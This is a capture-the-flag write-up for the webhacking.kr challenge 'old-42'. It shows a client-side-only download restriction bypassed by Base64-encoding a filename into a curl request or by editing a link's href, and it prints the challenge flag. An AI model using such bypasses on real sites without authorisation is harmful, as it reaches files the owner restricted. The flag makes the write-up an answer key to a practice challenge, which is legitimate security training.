# Old 42    Client Download Restriction

URL: [https://webhacking.kr/challenge/web-20/](https://webhacking.kr/challenge/web-20/)

![old-42.png](/assets/ctf/webhacking.kr/old-42.png)

We are presented with file download. We are able to download `test.txt`, but not `flag.docx`. 

Inspecting the request we see file to download if encoded with Base64.

![old-42-1.png](/assets/ctf/webhacking.kr/old-42-1.png)

```powershell
➜ be flag.docx
ZmxhZy5kb2N4
➜ curl 'https://webhacking.kr/challenge/web-20/?down=ZmxhZy5kb2N4'  -b 'PHPSESSID=fqn9tv8tbam8b4gi2edk8vc8bu' -o flag.docx
```

The download is successful. Looks like the restriction was only Client side.

![old-42-2.png](/assets/ctf/webhacking.kr/old-42-2.png)

> Flag: `FLAG{very_difficult_to_think_up_text_of_the_flag}`

---

You could also changed the `href` within HTML and download file without `curl`:
```html
<tr><td>1</td><td>read me</td><td>flag.docx [<a href="javascript:alert(&quot;Access%20Denied&quot;)">download</a>]</td></tr>
>>>
<tr><td>1</td><td>read me</td><td>flag.docx [<a href="?down=ZmxhZy5kb2N4">download</a>]</td></tr>
```

---

`bd` and `be` functions on powershell:
```powershell
# Quick Base64 Encode/Decode
function BD($base64)    { [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64)) }
function BE($plaintext) { [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($plaintext)) }
```